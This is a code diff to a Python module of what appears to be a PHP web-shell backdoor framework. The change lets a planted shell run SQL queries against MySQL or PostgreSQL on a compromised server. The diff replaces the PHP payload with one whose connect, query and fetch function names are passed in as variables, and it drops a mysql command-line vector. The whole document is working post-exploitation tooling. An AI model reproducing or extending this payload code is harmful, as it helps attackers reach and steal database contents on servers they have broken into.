@@ -18,15 +18,15 @@ class Query(Module):
     '''
     
     vectors = VectorList([
-            Vector('shell.php', 'mysql_php', """
-            if(@mysql_connect("%s","%s","%s")){
-                $result = mysql_query("%s");
-                while (list($table) = mysql_fetch_row($result)) {
+            Vector('shell.php', 'php_fetch', """
+            $c="%s"; $q="%s"; $f="%s";
+            if(@$c("%s","%s","%s")){
+                $result = $q("%s");
+                while (list($table) = $f($result)) {
                         echo $table."\n";
                 }
             }
-            """),
-            Vector('shell.sh', 'mysql_cli', 'mysql --host=%s --user=%s --password=%s -e "%s"')
+            """)
             ])
 
 
@@ -38,19 +38,28 @@ class Query(Module):
         
     def run( self, mode, host, user, pwd , query ):
 
-        if mode != 'mysql':
-            raise ModuleException(self.name,  "Only 'mysql' database is supported so far")
+        
+        if mode == 'mysql':
+            sql_connect = "mysql_connect"
+            sql_query = "mysql_query"
+            sql_fetch = "mysql_fetch_row"
+        elif mode == 'postgres':
+            sql_connect = "pg_connect"
+            sql_query = "pg_query"
+            sql_fetch = "pg_fetch_row"
+        else:
+            raise ModuleException(self.name,  "Database '%s' unsupported" % (mode))
 
         vector = self._get_default_vector2()
         if vector:
-            response = self.__execute_payload(vector, [host, user, pwd, query])
+            response = self.__execute_payload(vector, [sql_connect, sql_query, sql_fetch, host, user, pwd, query])
             if response != None:
                 self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                 return response
             
         vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
         for vector in vectors:
-            response = self.__execute_payload(vector, [host, user, pwd, query])
+            response = self.__execute_payload(vector, [sql_connect, sql_query, sql_fetch, host, user, pwd, query])
             if response != None:
                 self.mprint('[%s] Loaded using \'%s\' method' % (self.name, vector.name))
                 return response
